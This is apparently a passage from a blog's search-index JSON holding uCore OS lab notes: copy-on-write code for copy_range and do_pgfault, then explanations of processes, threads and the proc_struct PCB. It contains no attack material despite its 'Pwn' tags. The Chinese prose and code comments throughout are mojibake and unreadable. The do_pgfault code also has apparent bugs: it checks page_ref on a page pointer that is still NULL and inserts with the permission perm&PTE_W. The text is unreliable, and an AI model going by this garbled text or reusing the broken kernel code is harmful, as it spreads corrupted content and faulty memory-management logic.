(*ptep \u0026 PTE_P) { if ((nptep = get_pte(to, start, 1)) == NULL) { return -E_NO_MEM; } uint32_t perm = (*ptep \u0026 PTE_USER); //get page from ptep struct Page *page = pte2page(*ptep); int ret=0; if(share) // å¦‚æœæ˜¯å…±äº«çš„åªéœ€è¦å°†é¡µè¡¨é¡¹å¤åˆ¶å³å¯ã€‚ { ret = page_insert(to, page, start, perm \u0026~ PTE_W); // page_insert(from, page, start, perm \u0026~ PTE_W); } else { // alloc a page for process B struct Page *npage = alloc_page(); assert(page!=NULL); assert(npage!=NULL); uintptr_t src_kvaddr = page2kva(page); uintptr_t dst_kvaddr = page2kva(npage); memcpy(dst_kvaddr, src_kvaddr, PGSIZE); ret = page_insert(to, npage, start, perm); } assert(ret == 0); start += PGSIZE; } while (start != 0 \u0026\u0026 start \u003c end); return 0; } ä¿®æ”¹do_pgfault int do_pgfault(struct mm_struct *mm, uint32_t error_code, uintptr_t addr) { int ret = -E_INVAL; //try to find a vma which include addr struct vma_struct *vma = find_vma(mm, addr); pgfault_num++; //If the addr is in the range of a mm's vma? if (vma == NULL || vma-\u003evm_start \u003e addr) { cprintf(\"not valid addr %x, and can not find it in vma\\n\", addr); goto failed; } //check the error_code switch (error_code \u0026 3) { default: /* error code flag : default is 3 ( W/R=1, P=1): write, present */ case 2: /* error code flag : (W/R=1, P=0): write, not present */ if (!(vma-\u003evm_flags \u0026 VM_WRITE)) { cprintf(\"do_pgfault failed: error code flag = write AND not present, but the addr's vma cannot write\\n\"); goto failed; } break; case 1: /* error code flag : (W/R=0, P=1): read, present */ cprintf(\"do_pgfault failed: error code flag = read AND present\\n\"); goto failed; case 0: /* error code flag : (W/R=0, P=0): read, not present */ if (!(vma-\u003evm_flags \u0026 (VM_READ | VM_EXEC))) { cprintf(\"do_pgfault failed: error code flag = read AND not present, but the addr's vma cannot read or exec\\n\"); goto failed; } } /* IF (write an existed addr ) OR * (write an non_existed addr \u0026\u0026 addr is writable) OR * (read an non_existed addr \u0026\u0026 addr is readable) * THEN * continue process */ uint32_t perm = PTE_U; if (vma-\u003evm_flags \u0026 VM_WRITE) { perm |= PTE_W; } addr = ROUNDDOWN(addr, PGSIZE); ret = -E_NO_MEM; pte_t *ptep=NULL; #if 1 //(1) try to find a pte, if pte's PT(Page Table) isn't existed, then create a PT. if((ptep = get_pte(mm-\u003epgdir, addr, 1)) == NULL) { cprintf(\"get_pte in do_pgfalut failed\\n\"); goto failed; } if (*ptep == 0) { //(2) if the phy addr isn't exist, then alloc a page \u0026 map the phy addr with logical addr if(pgdir_alloc_page(mm-\u003epgdir, addr, perm) == NULL) { cprintf(\"pgdir_alloc_page in do_pgfalut failed\\n\"); goto failed; } } else { struct Page *page = NULL; if(*ptep \u0026 PTE_P) // å¦‚æœæ˜¯COWçš„é¡µ { if(page_ref(page) \u003e 1) { struct Page *npage = alloc_page(); page = pte2page(*ptep); assert(page!=NULL); assert(npage!=NULL); void *src_kvaddr = page2kva(page); void *dst_kvaddr = page2kva(npage); memcpy(dst_kvaddr, src_kvaddr, PGSIZE); // page_remove(mm-\u003epgdir, addr); // page_ref_dec(page); ret = page_insert(mm-\u003epgdir, npage, addr, perm\u0026PTE_W); } else ret = page_insert(mm-\u003epgdir, page, addr, perm\u0026PTE_W); } else { if(swap_init_ok) { //(1ï¼‰According to the mm AND addr, try to load the content of right disk page // into the memory which page managed. if((ret = swap_in(mm, addr, \u0026page)) != 0) { cprintf(\"swap_in in do_pgfalut failed\\n\"); goto failed; } //(2) According to the mm, addr AND page, setup the map of phy addr \u003c---\u003e logical addr page_insert(mm-\u003epgdir, page, addr, perm); //(3) make the page swappable. swap_map_swappable(mm, addr, page, 1); page-","date":"2021-12-14","objectID":"/ucore-lab-5/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#do-it"},{"categories":["Pwning"],"content":"æ¦‚è¿°åœ¨å‰å‡ æ¬¡å®éªŒçš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å°†å®ç°CPUçš„è™šæ‹ŸåŒ–ã€‚å¯ä»¥ç†è§£ä¸ºè®©æ¯ä¸ªç”¨æˆ·æ€è¿›ç¨‹è®¤ä¸ºè‡ªå·±â€œç‹¬å â€CPUèµ„æºã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#æ¦‚è¿°"},{"categories":["Pwning"],"content":"è¿›ç¨‹å¯¹äºè¿›ç¨‹çš„å®šä¹‰ï¼šè¿›ç¨‹æ˜¯æŒ‡ä¸€ä¸ªå…·æœ‰ä¸€å®šç‹¬ç«‹åŠŸèƒ½çš„ç¨‹åºåœ¨ä¸€ä¸ªæ•°æ®é›†åˆä¸Šçš„ä¸€æ¬¡åŠ¨æ€æ‰§è¡Œè¿‡ç¨‹ã€‚ è¿›ç¨‹åŒ…å«äº†æ­£åœ¨è¿è¡Œçš„ä¸€ä¸ªç¨‹åºçš„æ‰€æœ‰çŠ¶æ€ä¿¡æ¯ã€‚ï¼ˆä»£ç ï¼Œæ•°æ®ï¼Œå¯„å­˜å™¨ï¼Œè¿›ç¨‹æ‰€å èµ„æºç­‰ï¼‰ è¿›ç¨‹ä¸ç¨‹åº ç¨‹åºæ˜¯ä¸€ä¸ªé™æ€å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯æœ‰åºä»£ç çš„é›†åˆã€‚è€Œè¿›ç¨‹æ˜¯æ‰§è¡Œä¸­çš„ç¨‹åºï¼Œæœ‰å†…æ ¸æ€å’Œç”¨æˆ·æ€ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹"},{"categories":["Pwning"],"content":"è¿›ç¨‹æ§åˆ¶å—PCB PCBæè¿°è¿›ç¨‹çš„åŸºæœ¬æƒ…å†µä»¥åŠè¿è¡Œå˜åŒ–çš„è¿‡ç¨‹ è¿›ç¨‹æ§åˆ¶å—æ˜¯è¿›ç¨‹çš„å”¯ä¸€æ ‡è¯†ã€‚ è°ƒåº¦å’ŒçŠ¶æ€ä¿¡æ¯ã€è¿›ç¨‹é—´é€šä¿¡ä¿¡æ¯ã€å­˜å‚¨ç®¡ç†ä¿¡æ¯ã€è¿›ç¨‹æ‰€ç”¨çš„èµ„æºå’Œä¸PCBç›¸å…³çš„è¿›ç¨‹é˜Ÿåˆ—ã€‚å¦‚ç”¨é“¾è¡¨ç»´æŠ¤æ­£åœ¨å°±ç»ªæ€çš„æ‰€æœ‰è¿›ç¨‹ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹æ§åˆ¶å—pcb"},{"categories":["Pwning"],"content":"è¿›ç¨‹çŠ¶æ€è¿›ç¨‹ç”Ÿå‘½å‘¨æœŸçš„åˆ’åˆ†ï¼šè¿›ç¨‹åˆ›å»ºã€è¿›ç¨‹æ‰§è¡Œã€è¿›ç¨‹ç­‰å¾…ã€è¿›ç¨‹æŠ¢å ã€è¿›ç¨‹å”¤é†’å’Œè¿›ç¨‹ç»“æŸã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹çŠ¶æ€"},{"categories":["Pwning"],"content":"è¿›ç¨‹åˆ›å»ºè¿›ç¨‹åˆ›å»ºçš„æƒ…å†µï¼š ç³»ç»Ÿåˆå§‹åŒ–æ—¶ ç”¨æˆ·è¯·æ±‚åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æ‰§è¡Œäº†åˆ›å»ºè¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ åˆ›å»ºçš„è¿›ç¨‹ï¼Œåœ¨ä¸ºå…¶å‡†å¤‡å¥½ç›¸åº”çš„èµ„æºåï¼Œä¼šåŠ å…¥å°±ç»ªé˜Ÿåˆ—ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹åˆ›å»º"},{"categories":["Pwning"],"content":"è¿›ç¨‹æ‰§è¡ŒCPUçš„åˆ†æ—¶æ‰§è¡Œï¼Œå½“ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œäº†ä¸€ä¸ªæ—¶é—´ç‰‡åï¼Œå†…æ ¸ä»å°±ç»ªé˜Ÿåˆ—åŸºäºæŸç§ç­–ç•¥é€‰æ‹©ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:2","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹æ‰§è¡Œ"},{"categories":["Pwning"],"content":"è¿›ç¨‹ç­‰å¾…è¿›ç¨‹ç­‰å¾…ï¼ˆé˜»å¡ï¼‰çš„æƒ…å†µï¼š è¯·æ±‚å¹¶ç­‰å¾…ç³»ç»ŸæœåŠ¡ï¼Œæ— æ³•é©¬ä¸Šå®Œæˆ å¯åŠ¨æŸç§æ“ä½œï¼Œæ— æ³•é©¬ä¸Šå®Œæˆ éœ€è¦çš„æ•°æ®æ²¡æœ‰åˆ°è¾¾ï¼ˆä¾‹å¦‚ç£ç›˜è¯»å†™ï¼‰ è¿›ç¨‹è¿›å…¥ç­‰å¾…çŠ¶æ€åªä¼šæ˜¯è¿›ç¨‹è‡ªèº«çš„åŸå› ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:3","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹ç­‰å¾…"},{"categories":["Pwning"],"content":"è¿›ç¨‹å”¤é†’å½“ç­‰å¾…çŠ¶æ€çš„è¿›ç¨‹æ‰€è¦æ±‚çš„æ¡ä»¶ï¼ˆèµ„æºå‡†å¤‡å¥½ï¼ŒæŸäº‹ä»¶çš„å‘ç”Ÿï¼‰æ»¡è¶³åï¼Œä¼šåŠ å…¥åˆ°å°±ç»ªçŠ¶æ€ã€‚ è¿›ç¨‹åªä¼šè¢«åˆ«çš„è¿›ç¨‹æˆ–æ“ä½œç³»ç»Ÿå”¤é†’ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:4","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹å”¤é†’"},{"categories":["Pwning"],"content":"è¿›ç¨‹ç»“æŸé‡Šæ”¾è¿›ç¨‹æ‰€å çš„æ‰€æœ‰èµ„æº ç»“æŸçš„æƒ…å†µï¼šæ­£å¸¸é€€å‡ºã€é”™è¯¯é€€å‡ºã€è‡´å‘½é”™è¯¯ã€è¢«å…¶ä»–è¿›ç¨‹æ€æ­» ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:5","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹ç»“æŸ"},{"categories":["Pwning"],"content":"è¿›ç¨‹æŒ‚èµ·ç³»ç»Ÿçš„å†…å­˜ä¸è¶³æ—¶ï¼Œéœ€è¦å°†æŸäº›è¿›ç¨‹æ”¾åˆ°ç£ç›˜ä¸­ï¼Œç§°ä¸ºè¿›ç¨‹æŒ‚èµ·ã€‚ ç­‰å¾…æŒ‚èµ·ï¼ˆBlocked-suspendï¼‰ï¼š è¿›ç¨‹åœ¨å¤–å­˜å¹¶ç­‰å¾…æŸäº‹ä»¶çš„å‡ºç°ã€‚ å°±ç»ªæŒ‚èµ·ï¼ˆReady-suspendï¼‰ï¼šè¿›ç¨‹åœ¨å¤–å­˜ï¼Œä½†åªè¦è¿›å…¥å†…å­˜ï¼Œå³å¯è¿è¡Œã€‚ æŒ‚èµ·ï¼ˆSuspendï¼‰ï¼šæŠŠä¸€ä¸ªè¿›ç¨‹ä»å†…å­˜è½¬åˆ°å¤–å­˜ã€‚ ç­‰å¾…åˆ°ç­‰å¾…æŒ‚èµ·ï¼šæ²¡æœ‰è¿›ç¨‹å¤„äºå°±ç»ªçŠ¶æ€æˆ–å°±ç»ªè¿›ç¨‹è¦æ±‚æ›´å¤šå†…å­˜èµ„æºã€‚ å°±ç»ªåˆ°å°±ç»ªæŒ‚èµ·ï¼šå½“æœ‰é«˜ä¼˜å…ˆçº§è¿›ç¨‹å¤„äºç­‰å¾…çŠ¶æ€ï¼ˆç³»ç»Ÿè®¤ä¸ºå¾ˆå¿«ä¼šå°±ç»ªçš„ï¼‰ï¼Œä½ä¼˜å…ˆçº§å°±ç»ªè¿›ç¨‹ä¼šæŒ‚èµ·ï¼Œä¸ºé«˜ä¼˜å…ˆçº§è¿›ç¨‹æä¾›æ›´å¤§çš„å†…å­˜ç©ºé—´ã€‚ è¿è¡Œåˆ°å°±ç»ªæŒ‚èµ·ï¼šå½“æœ‰é«˜ä¼˜å…ˆçº§ç­‰å¾…è¿›ç¨‹å› äº‹ä»¶å‡ºç°è€Œè¿›å…¥å°±ç»ªæŒ‚èµ·ã€‚ ç­‰å¾…æŒ‚èµ·åˆ°å°±ç»ªæŒ‚èµ·ï¼šå½“æœ‰ç­‰å¾…æŒ‚èµ·è¿›ç¨‹å› ç›¸å…³äº‹ä»¶å‡ºç°è€Œè½¬æ¢çŠ¶æ€ã€‚ æ¿€æ´»ï¼ˆActivateï¼‰ï¼šæŠŠä¸€ä¸ªè¿›ç¨‹ä»å¤–å­˜è½¬åˆ°å†…å­˜ å°±ç»ªæŒ‚èµ·åˆ°å°±ç»ªï¼šæ²¡æœ‰å°±ç»ªè¿›ç¨‹æˆ–æŒ‚èµ·å°±ç»ªè¿›ç¨‹ä¼˜å…ˆçº§é«˜äºå°±ç»ªè¿›ç¨‹ã€‚ ç­‰å¾…æŒ‚èµ·åˆ°ç­‰å¾…ï¼šå½“ä¸€ä¸ªè¿›ç¨‹é‡Šæ”¾è¶³å¤Ÿå†…å­˜ï¼Œå¹¶æœ‰é«˜ä¼˜å…ˆçº§ç­‰å¾…æŒ‚èµ·è¿›ç¨‹ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:6","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹æŒ‚èµ·"},{"categories":["Pwning"],"content":"çº¿ç¨‹çº¿ç¨‹çš„å‡ºç°ï¼šæˆ‘ä»¬å¸Œæœ›è¿›ç¨‹ä¹‹é—´æœ‰æ›´å¥½çš„å¹¶å‘æ€§ï¼Œå¹¶å®ç°æ›´é«˜ç¨‹åº¦çš„æ•°æ®å…±äº«ã€‚è€Œè¿™ä¸è¿›ç¨‹çš„ç‹¬ç«‹æ€§ç›¸çŸ›ç›¾ï¼Œæ‰€ä»¥æœ‰äº†çº¿ç¨‹ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#çº¿ç¨‹"},{"categories":["Pwning"],"content":"æ¦‚å¿µçº¿ç¨‹æ˜¯è¿›ç¨‹çš„ä¸€éƒ¨åˆ†ï¼Œæè¿°æŒ‡ä»¤æµæ‰§è¡ŒçŠ¶æ€ï¼Œæ˜¯è¿›ç¨‹ä¸­çš„æŒ‡ä»¤æ‰§è¡Œæµæœ€å°å•ä½ï¼Œæ˜¯CPUè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚ è¿›ç¨‹çš„èµ„æºåˆ†é…è§’è‰²ï¼šè¿›ç¨‹ç”±ä¸€ç»„ç›¸å…³èµ„æºæ„æˆï¼ŒåŒ…æ‹¬åœ°å€ç©ºé—´ã€æ‰“å¼€çš„æ–‡ä»¶ç­‰å„ç§èµ„æºã€‚ çº¿ç¨‹çš„å¤„ç†æœºè°ƒåº¦è§’è‰²ï¼šçº¿ç¨‹æè¿°åœ¨è¿›ç¨‹èµ„æºç¯å¢ƒä¸­æŒ‡ä»¤æµæ‰§è¡ŒçŠ¶æ€ã€‚ è¿›ç¨‹å˜æˆäº†èµ„æºåˆ†é…çš„å•ä½ï¼Œçº¿ç¨‹æ˜¯CPUè°ƒåº¦çš„å•ä½ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#æ¦‚å¿µ"},{"categories":["Pwning"],"content":"ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼š ä¸€ä¸ªè¿›ç¨‹ä¸­å¯ä»¥å­˜åœ¨å¤šä¸ªçº¿ç¨‹ å„ä¸ªçº¿ç¨‹å¯ä»¥å¹¶å‘æ‰§è¡Œ å„ä¸ªçº¿ç¨‹ä¹‹é—´å¯ä»¥å…±äº«åœ°å€ç©ºé—´å’Œæ–‡ä»¶ç­‰èµ„æºã€‚ ç¼ºç‚¹ï¼š ä¸€ä¸ªçº¿ç¨‹å´©æºƒï¼Œä¼šå¯¼è‡´å…¶æ‰€å±çš„è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹å´©æºƒã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:1:1","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ä¼˜ç¼ºç‚¹"},{"categories":["Pwning"],"content":"ç”¨æˆ·çº¿ç¨‹ç”±ä¸€ç»„ç”¨æˆ·çº§çš„çº¿ç¨‹åº“å‡½æ•°æ¥å®Œæˆçº¿ç¨‹çš„ç®¡ç†ï¼ŒåŒ…æ‹¬çº¿ç¨‹çš„åˆ›å»ºã€ç»ˆæ­¢ã€åŒæ­¥å’Œè°ƒåº¦ç­‰ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ç”¨æˆ·çº¿ç¨‹"},{"categories":["Pwning"],"content":"ç‰¹ç‚¹ç”¨æˆ·çº¿ç¨‹ä¸ä¾èµ–æ“ä½œç³»ç»Ÿï¼Œåœ¨æ“ä½œç³»ç»Ÿçš„è§’åº¦é¢å¯¹çš„ä¾ç„¶åªæœ‰æ¯ä¸ªè¿›ç¨‹çš„PCBã€‚è€Œåœ¨ç”¨æˆ·æ€ï¼Œæœ‰å„ä¸ªè¿›ç¨‹å†…éƒ¨å®ç°çº¿ç¨‹æ§åˆ¶å—TCBã€‚å¹¶å®ç°è‡ªå®šä¹‰çš„çº¿ç¨‹è°ƒåº¦ç®—æ³•ã€‚ ç”±äºä¸ç»è¿‡æ“ä½œç³»ç»Ÿï¼Œæ‰€æœ‰æ²¡æœ‰äº†ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„åˆ‡æ¢ï¼Œå‡å°‘äº†å¾ˆå¤§çš„å¼€é”€ã€‚ä¸”æœ‰æ›´è‡ªç”±çš„çº¿ç¨‹è°ƒç”¨ç­–ç•¥ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ç‰¹ç‚¹"},{"categories":["Pwning"],"content":"ç¼ºç‚¹çº¿ç¨‹å‘èµ·ç³»ç»Ÿè°ƒç”¨è¯·æ±‚æ“ä½œç³»ç»ŸæœåŠ¡æ—¶ï¼Œå¯¹æ“ä½œç³»ç»Ÿæ¥è¯´æ˜¯ä»¥ä¸€ä¸ªè¿›ç¨‹çš„åä¹‰æ“ä½œçš„ã€‚å¦‚æœé˜»å¡ï¼Œæ•´ä¸ªè¿›ç¨‹éƒ½ä¼šè¿›å…¥ç­‰å¾…çŠ¶æ€ã€‚è€Œä¸”ä¸æ”¯æŒåŸºäºçº¿ç¨‹çš„å¤„ç†æœºæŠ¢å ã€‚æ“ä½œç³»ç»Ÿä»…åˆ†é…ä¸€ä¸ªè¿›ç¨‹çš„æ—¶é—´ç‰‡ï¼Œè¿™æ ·æ‰€æœ‰çº¿ç¨‹åˆ†é…åˆ°çš„æ‰§è¡Œæ—¶é—´å¾ˆå°‘ï¼Œåªèƒ½æŒ‰è¿›ç¨‹åˆ†é…CPUæ—¶é—´ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:2","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ç¼ºç‚¹"},{"categories":["Pwning"],"content":"å†…æ ¸çº¿ç¨‹å°†çº¿ç¨‹çš„æ“ä½œåŠ å…¥åˆ°å†…æ ¸ä¸­ï¼Œç”±å†…æ ¸é€šè¿‡ç³»ç»Ÿè°ƒç”¨å®ç°çš„çº¿ç¨‹æœºåˆ¶ï¼Œç”±å†…æ ¸å®Œæˆçº¿ç¨‹çš„åˆ›å»ºã€ç»ˆæ­¢å’Œç®¡ç†ã€‚ è¿™æ ·è§£å†³äº†ç”¨æˆ·çº¿ç¨‹çš„å¾ˆå¤šé—®é¢˜ï¼Œä½†æ˜¯åŠ å¤§äº†çº¿ç¨‹ç”¨æˆ·æ€ä¸å†…æ ¸æ€ä¹‹é—´åˆ‡æ¢çš„æ¶ˆè€—ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:3:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#å†…æ ¸çº¿ç¨‹"},{"categories":["Pwning"],"content":"è½»æƒçº¿ç¨‹ å†…æ ¸æ”¯æŒçš„ç”¨æˆ·çº¿ç¨‹ã€‚ä¸€ä¸ªè¿›ç¨‹å¯åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªè½»æƒè¿›ç¨‹ï¼Œæ¯ä¸ªè½»æƒè¿›ç¨‹ç”±ä¸€ä¸ªå•ç‹¬çš„å†…æ ¸çº¿ç¨‹æ¥æ”¯æŒã€‚ è¿‡äºå¤æ‚ä»¥è‡³äºä¼˜ç‚¹æ²¡æœ‰ä½“ç°å‡ºæ¥ï¼Œæœ€åæ¼”åŒ–ä¸ºå•ä¸€çš„å†…æ ¸çº¿ç¨‹æ”¯æŒã€‚ï¼ˆç¬‘ï¼‰ ","date":"2021-12-13","objectID":"/ucore-lab-4/:4:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è½»æƒçº¿ç¨‹"},{"categories":["Pwning"],"content":"çº¿ç¨‹ä¸è¿›ç¨‹çš„æ¯”è¾ƒ è¿›ç¨‹æ˜¯èµ„æºåˆ†é…å•å…ƒï¼Œè€Œçº¿ç¨‹æ˜¯CPUè°ƒåº¦å•ä½ã€‚ è¿›ç¨‹æ‹¥æœ‰ä¸€ä¸ªå®Œæ•´çš„èµ„æºå¹³å°ï¼Œè€Œçº¿ç¨‹åªç‹¬äº«æŒ‡ä»¤æµæ‰§è¡Œçš„å¿…è¦èµ„æºï¼Œä¾‹å¦‚å¯„å­˜å™¨ä¸æ ˆã€‚ çº¿ç¨‹å…·æœ‰å°±ç»ªã€ç­‰å¾…å’Œè¿è¡Œä¸‰ç§åŸºæœ¬çŠ¶æ€å’ŒçŠ¶æ€é—´çš„è½¬æ¢å…³ç³»ã€‚ çº¿ç¨‹èƒ½å‡å°å¹¶å‘æ‰§è¡Œçš„äº‹ä»¶å’Œç©ºé—²å¼€é”€ã€‚ çº¿ç¨‹çš„åˆ›å»ºæ—¶é—´å’Œç»ˆæ­¢æ—¶é—´æ¯”è¿›ç¨‹çŸ­ã€‚ åŒä¸€è¿›ç¨‹å†…çš„çº¿ç¨‹åˆ‡æ¢æ—¶é—´æ¯”è¿›ç¨‹çŸ­ã€‚ ç”±äºåŒä¸€è¿›ç¨‹çš„å„çº¿ç¨‹é—´å…±äº«å†…å­˜å’Œæ–‡ä»¶èµ„æºï¼Œå¯ä¸é€šè¿‡å†…æ ¸è¿›è¡Œç›´æ¥é€šä¿¡ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:5:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#çº¿ç¨‹ä¸è¿›ç¨‹çš„æ¯”è¾ƒ"},{"categories":["Pwning"],"content":"è¿›ç¨‹åˆ‡æ¢æš‚åœå½“å‰è¿›ç¨‹ï¼Œå¹¶ä»è¿è¡ŒçŠ¶æ€å˜æˆå…¶ä»–çŠ¶æ€ã€‚è°ƒåº¦å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œå¹¶ä»å°±ç»ªçŠ¶æ€è½¬ä¸ºè¿è¡ŒçŠ¶æ€ã€‚ è¿›ç¨‹åˆ‡æ¢è¦æ±‚ï¼š åˆ‡æ¢å‰ï¼Œä¿å­˜ä¸Šä¸‹æ–‡ åˆ‡æ¢åï¼Œæ¢å¤ä¸Šä¸‹æ–‡ é€Ÿåº¦è¦å¿« ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹åˆ‡æ¢"},{"categories":["Pwning"],"content":"ucoreçš„PCB enum proc_state { PROC_UNINIT = 0, // æœªåˆå§‹åŒ–çš„ -- alloc_proc PROC_SLEEPING, // ç­‰å¾…çŠ¶æ€ -- try_free_pages, do_wait, do_sleep PROC_RUNNABLE, // å°±ç»ª/è¿è¡ŒçŠ¶æ€ -- proc_init, wakeup_proc, PROC_ZOMBIE, // åƒµæ­»çŠ¶æ€ -- do_exit }; struct context { // ä¿å­˜çš„ä¸Šä¸‹æ–‡å¯„å­˜å™¨ï¼Œæ³¨æ„æ²¡æœ‰eaxå¯„å­˜å™¨å’Œæ®µå¯„å­˜å™¨ uint32_t eip; uint32_t esp; uint32_t ebx; uint32_t ecx; uint32_t edx; uint32_t esi; uint32_t edi; uint32_t ebp; }; struct proc_struct { enum proc_state state; // Process state int pid; // Process ID int runs; // the running times of Proces uintptr_t kstack; // Process kernel stack volatile bool need_resched; // bool value: need to be rescheduled to release CPU? struct proc_struct *parent; // the parent process struct mm_struct *mm; // Process's memory management field struct context context; // Switch here to run process struct trapframe *tf; // Trap frame for current interrupt uintptr_t cr3; // CR3 register: the base addr of Page Directroy Table(PDT) uint32_t flags; // Process flag char name[PROC_NAME_LEN + 1]; // Process name list_entry_t list_link; // Process link list list_entry_t hash_link; // Process hash list }; mmï¼šå†…å­˜ç®¡ç†çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å†…å­˜æ˜ å°„åˆ—è¡¨ã€é¡µè¡¨æŒ‡é’ˆç­‰ã€‚mmæˆå‘˜å˜é‡åœ¨lab3ä¸­ç”¨äºè™šå­˜ç®¡ç†ã€‚ä½†åœ¨å®é™…OSä¸­ï¼Œå†…æ ¸çº¿ç¨‹å¸¸é©»å†…å­˜ï¼Œä¸éœ€è¦è€ƒè™‘swap pageé—®é¢˜ï¼Œåœ¨lab5ä¸­æ¶‰åŠåˆ°äº†ç”¨æˆ·è¿›ç¨‹ï¼Œæ‰è€ƒè™‘è¿›ç¨‹ç”¨æˆ·å†…å­˜ç©ºé—´çš„swap pageé—®é¢˜ï¼Œmmæ‰ä¼šå‘æŒ¥ä½œç”¨ã€‚æ‰€ä»¥åœ¨lab4ä¸­mmå¯¹äºå†…æ ¸çº¿ç¨‹å°±æ²¡æœ‰ç”¨äº†ï¼Œè¿™æ ·å†…æ ¸çº¿ç¨‹çš„proc_structçš„æˆå‘˜å˜é‡*mm=0æ˜¯åˆç†çš„ã€‚mmé‡Œæœ‰ä¸ªå¾ˆé‡è¦çš„é¡¹pgdirï¼Œè®°å½•çš„æ˜¯è¯¥è¿›ç¨‹ä½¿ç”¨çš„ä¸€çº§é¡µè¡¨çš„ç‰©ç†åœ°å€ã€‚ç”±äº*mm=NULLï¼Œæ‰€ä»¥åœ¨proc_structæ•°æ®ç»“æ„ä¸­éœ€è¦æœ‰ä¸€ä¸ªä»£æ›¿pgdiré¡¹æ¥è®°å½•é¡µè¡¨èµ·å§‹åœ°å€ï¼Œè¿™å°±æ˜¯proc_structæ•°æ®ç»“æ„ä¸­çš„cr3æˆå‘˜å˜é‡ã€‚ stateï¼šè¿›ç¨‹æ‰€å¤„çš„çŠ¶æ€ã€‚ parentï¼šç”¨æˆ·è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼ˆåˆ›å»ºå®ƒçš„è¿›ç¨‹ï¼‰ã€‚åœ¨æ‰€æœ‰è¿›ç¨‹ä¸­ï¼Œåªæœ‰ä¸€ä¸ªè¿›ç¨‹æ²¡æœ‰çˆ¶è¿›ç¨‹ï¼Œå°±æ˜¯å†…æ ¸åˆ›å»ºçš„ç¬¬ä¸€ä¸ªå†…æ ¸çº¿ç¨‹idleprocã€‚å†…æ ¸æ ¹æ®è¿™ä¸ªçˆ¶å­å…³ç³»å»ºç«‹ä¸€ä¸ªæ ‘å½¢ç»“æ„ï¼Œç”¨äºç»´æŠ¤ä¸€äº›ç‰¹æ®Šçš„æ“ä½œï¼Œä¾‹å¦‚ç¡®å®šæŸä¸ªè¿›ç¨‹æ˜¯å¦å¯ä»¥å¯¹å¦å¤–ä¸€ä¸ªè¿›ç¨‹è¿›è¡ŒæŸç§æ“ä½œç­‰ç­‰ã€‚ contextï¼šè¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œç”¨äºè¿›ç¨‹åˆ‡æ¢ï¼ˆå‚è§switch.Sï¼‰ã€‚åœ¨ uCoreä¸­ï¼Œæ‰€æœ‰çš„è¿›ç¨‹åœ¨å†…æ 